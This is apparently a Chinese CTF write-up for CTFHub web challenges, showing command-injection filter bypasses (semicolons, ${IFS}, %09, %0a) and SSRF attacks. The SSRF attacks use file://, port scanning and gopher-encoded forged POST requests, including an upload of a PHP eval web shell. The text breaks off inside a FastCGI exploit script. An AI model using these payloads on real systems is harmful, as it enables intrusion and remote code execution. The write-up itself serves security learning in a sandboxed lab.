<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222151739546.png" alt="image-20231222151739546"></p>
<h3 id="过滤cat">过滤cat</h3>
<pre><code class="hljs sh">?ip=127.0.0.1|<span class="hljs-built_in">tac</span> flag_232592471929828.php|<span class="hljs-built_in">base64</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222152026089.png" alt="image-20231222152026089"></p>
<p>解密即可</p>
<h3 id="过滤空格">过滤空格</h3>
<pre><code class="hljs php">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>|tac${IFS}flag_15920651517426.php</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222152236877.png" alt="image-20231222152236877"></p>
<pre><code class="hljs plaintext">&lt; 、&lt;&gt;、%20(space)、%09(tab)、\$IFS\$9、 \${IFS}、$IFS</code></pre>
<h3 id="过滤目录分隔符">过滤目录分隔符</h3>
<p>这里看到题目过滤了<code>/</code>符号，陷入知识盲区了，想着编码可以绕过，但没有效果，不知道为何。看了wp发现似乎是考察对于管道符的理解的，我们可以采用;符号</p>
<p>;ls发现flag所在目录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222154059410.png" alt="image-20231222154059410"></p>
<p>那接下来我们这样构造</p>
<pre><code class="hljs sh">?ip=;<span class="hljs-built_in">cd</span> flag_is_here;<span class="hljs-built_in">ls</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222154113594.png" alt="image-20231222154113594"></p>
<p>cat读取即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222154140256.png" alt="image-20231222154140256"></p>
<h3 id="过滤运算符">过滤运算符</h3>
<p>这里看代码过滤了&amp;和/符号，我们直接用;即可</p>
<p><code>?ip=;cat flag_146781707832397.php</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222154840357.png" alt="image-20231222154840357"></p>
<h3 id="综合过滤练习">综合过滤练习</h3>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ip'</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ip'</span>]) {
    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ip'</span>];
    <span class="hljs-variable">$m</span> = [];
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) {
        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">"ping -c 4 <span class="hljs-subst">{$ip}</span>"</span>;
        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里过滤了|、&amp;、;、\、cat、flag、ctfhub，这里可以采用%0a换行符或者%09Tab制表符绕过</p>
<p><strong>在 Linux 中使用 Tab 键，可以实现命令补全、文件和目录名补全等。</strong></p>
<pre><code class="hljs sh">?ip=%0acd%09*here%0atac<span class="hljs-variable">${IFS}</span>fla<span class="hljs-string">''</span>g_61041444712473.php</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222160446048.png" alt="image-20231222160446048"></p>
<h2 id="ssrf">SSRF</h2>
<h3 id="内网访问">内网访问</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222161315946.png" alt="image-20231222161315946"></p>
<p>这里直接按照如上访问即可得到</p>
<h3 id="伪协议读取文件">伪协议读取文件</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222161449988.png" alt="image-20231222161449988"></p>
<p>采用file伪协议直接读取到</p>
<h3 id="端口扫描">端口扫描</h3>
<p>这里说是端口扫描且范围在8000-9000，那我们利用dict或者http协议即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222162419632.png" alt="image-20231222162419632"></p>
<p>我们构造如上payload对8000位置进行爆破即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222162442551.png" alt="image-20231222162442551"></p>
<p>共计完成后发现一个长度明显不同的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222162505132.png" alt="image-20231222162505132"></p>
<p>最后利用http协议访问该端口发现flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222162521166.png" alt="image-20231222162521166"></p>
<h3 id="post请求">POST请求</h3>
<p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
<p>这题又是我的知识盲区，就跟着wp走了，思路如下。</p>
<p>一般遇到这种漏洞我们需要先利用简单的file、http、dict协议进行初步的判断，比如端口开放情况，其内网文件那些可读等等。那这里我们就先看看能否读取到127.0.0.1里面的文件</p>
<pre><code class="hljs php">?url=file:<span class="hljs-comment">///var/www/html/index.php</span></code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>])){
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: /?url=_"</span>);
    <span class="hljs-keyword">exit</span>;
}
<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>]);
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);
<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>再读flag.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>] != <span class="hljs-string">"127.0.0.1"</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Just View From 127.0.0.1"</span>;
    <span class="hljs-keyword">return</span>;
}
<span class="hljs-variable">$flag</span>=<span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">"CTFHUB"</span>);
<span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"key"</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">"key"</span>] == <span class="hljs-variable">$key</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
    <span class="hljs-keyword">exit</span>;
}
<span class="hljs-meta">?&gt;</span>
&lt;form action=<span class="hljs-string">"/flag.php"</span> method=<span class="hljs-string">"post"</span>&gt;
&lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"key"</span>&gt;
&lt;!-- Debug: key=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<span class="hljs-meta">?&gt;</span>--&gt;
&lt;/form&gt;</code></pre>
<p>这里说地址只能为127.0.0.1且如果我们传入正确的key即可获得flag（但必须是post传入key），并且提示我们访问flag.php即可得到key，如下图：<code>key=fd2d96bb2014fc2e6989fca7ece45856</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222163823929.png" alt="image-20231222163823929"></p>
<p>接下来就应该想着谁可以进行post传参，这里看了wp知道是gopher协议可以</p>
<pre><code class="hljs plaintext">gopher伪协议（curl支持gopher），发送GET或POST请求(需要配合http协议二次url编码上传)；
本题要用gopher发送POST请求，gopher的格式是gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接tcp流，本题默认伪gopher://127.0.0.1:80/_后接post请求 ，完整的gopher请求如下：</code></pre>
<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:80
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>36
 
key=fd2d96bb2014fc2e6989fca7ece45856</code></pre>
<p>具体原理一会儿再说，然后我们将它进行url编码，进行编码时要注意：</p>
<blockquote>
<ol>
<li>问号（？）需要转码为URL编码，也就是%3f(本题不涉及这个问题)</li>
<li>回车换行要变为%0d%0a，但如果直接用工具转，可能只会有%0a</li>
<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li>
</ol>
</blockquote>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse

payload = <span class="hljs-string">"""POST /flag.php HTTP/1.1</span>
<span class="hljs-string">Host: 127.0.0.1:80</span>
<span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span>
<span class="hljs-string">Content-Length: 36</span>
<span class="hljs-string"></span>
<span class="hljs-string">key=b8241a456e991e16ea69f441fd0cb214</span>
<span class="hljs-string">"""</span>

<span class="hljs-comment"># 注意payload的最后一行是回车（空行），表示http请求结束</span>
tmp = urllib.parse.quote(payload)
new = tmp.replace(<span class="hljs-string">'%0A'</span>, <span class="hljs-string">'%0D%0A'</span>)
new2 = urllib.parse.quote(new)
result = <span class="hljs-string">'gopher://127.0.0.1:80/_'</span> + new2
<span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 这里因为是GET请求所以要进行两次url编码</span></code></pre>
<p>之后bp发送即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222170512279.png" alt="image-20231222170512279"></p>
<p>这里在复现的时候遇到的问题也很多，在此梳理一下</p>
<p>第一个是关于gopher协议编码几次的问题：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222194054670.png" alt="image-20231222194054670"></p>
<p>这里好理解一点就是：比如我们想要利用gopher协议攻击一个服务器的内网，并且该服务器某处存在一个ssrf的漏洞，那我们肯定要在此处传入我们的gopher协议进行打击，但在此之前呢，该web端对于我们传入的参数（也就是gopher协议的内容）进行了多次请求（或者叫做处理），但这些请求对我们来说是多余不必要的，我们想要的是最后一次可以达到对内网服务的请求。</p>
<p>但再次之前服务器对该参数内容进行了多次处理：url解码，这可能会导致我们在最终攻击之前，其gopher协议里面的部分参数被解析为无效的字符之类的导致我们的攻击失败，因此我们需要进行足够次数的url编码，让其保证在最后一次对内网服务请求的时候在对我们的gopher内容进行最后一次url解码。–如果理解有误，勿喷~~</p>
<p>那接下来让我们回顾一下上述代码，分析一下需要进行几次编码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>])){
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: /?url=_"</span>);
    <span class="hljs-keyword">exit</span>;
}
<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>]);
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);
<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里说是如果url参数不存在则进行302跳转，如果存在呢，则在正常进行curl的http请求，而这一处代码：</p>
<p><code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</code> - 如果HTTP响应包含“Location:”重定向，那么这个选项允许cURL遵循至新的位置(重定向)。</p>
<p>那这里基本明确了，首先我们在url进行get传参的时候呢，该web服务器会自动对其中的内容进行<strong>一次编码</strong>，接着在index.php页面呢，进行了一次curl的http请求（而这个请求是我们想要的）这也就意味着我们需要进行两次编码，</p>
<p>但我看了几篇wp发现有的还进行了3次编码，这里我猜测因为他们在传参的时候首先是请求的index.php页面，之后再请求flag.php，但如果先请求index.php页面呢，这个http响应是包含location重定向的，这里与<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</code>配合会进行一次302重定向的请求，因此会增加一次url编码次数。</p>
<p>如果我们的请求直接是对flag.php进行的，那就只需要两次了</p>
<h3 id="上传文件">上传文件</h3>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>])) {
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: /?url=_"</span>);
    <span class="hljs-keyword">exit</span>;
}

<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>]);
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);
<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>flag.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>] != <span class="hljs-string">"127.0.0.1"</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Just View From 127.0.0.1"</span>;
    <span class="hljs-keyword">return</span>;
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"size"</span>] &gt; <span class="hljs-number">0</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">"CTFHUB"</span>);
    <span class="hljs-keyword">exit</span>;
}
<span class="hljs-meta">?&gt;</span>
Upload Webshell

&lt;form action=<span class="hljs-string">"/flag.php"</span> method=<span class="hljs-string">"post"</span> enctype=<span class="hljs-string">"multipart/form-data"</span>&gt;
    &lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"file"</span>&gt;
&lt;/form&gt;</code></pre>
<p>这里检查是否有一个名为“file”的文件上传到了脚本，并且这个文件的大小大于0字节。换句话说，脚本期待接收到一个文件上传。</p>
<p>这里也是懵逼了，忘记是考察gopher协议了，我还以为有什么其他伪协议有可以上传文件之类的请求呢，但却忘记了本质都是post请求。依旧使用gopher即可</p>
<p>不过这里对我来说不知道如何构造文件上传包，因此看了wp发现恍然大悟，很佩服</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222203532162.png" alt="image-20231222203532162"></p>
<p>这里我们访问指定页面会发现并没有提交按钮，但我们可以修改前端代码添加啊：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222203852572.png" alt="image-20231222203852572"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222203848369.png" alt="image-20231222203848369"></p>
<p>接下来我们抓一个文件上传的包即可</p>
<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>306
<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0
<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary1KSttxB6ZH3HWz2e
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close

<span class="language-php">------WebKitFormBoundary1KSttxB6ZH3HWz2e</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">"file"</span>; filename=<span class="hljs-string">"shell.jpg"</span></span>
<span class="language-php">Content-Type: image/jpeg</span>
<span class="language-php"></span>
<span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundary1KSttxB6ZH3HWz2e</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">"hybcx"</span></span>
<span class="language-php"></span>
<span class="language-php">提交</span>
<span class="language-php">------WebKitFormBoundary1KSttxB6ZH3HWz2e--</span>
<span class="language-php"></span></code></pre>
<p>用上述介绍的python代码对其进行二次url编码即可，建议上述payload的最后一行别去掉，这代表着http请求的结束标志</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222204342856.png" alt="image-20231222204342856"></p>
<h3 id="fastcgi协议">FastCGI协议</h3>
<p>这道题我看着知识面挺广的，所以这里就直接跟着文章复现，具体的原理我另起一篇文章续写</p>
<p>这里我们在理解了原理之后直接上exp</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO
<span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>
PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):
    <span class="hljs-keyword">if</span> PY2:
        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])
<span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):
        <span class="hljs-keyword">return</span> c
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):
        <span class="hljs-keyword">return</span> s
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">'utf-8'</span>, <span class="hljs-string">'strict'</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):
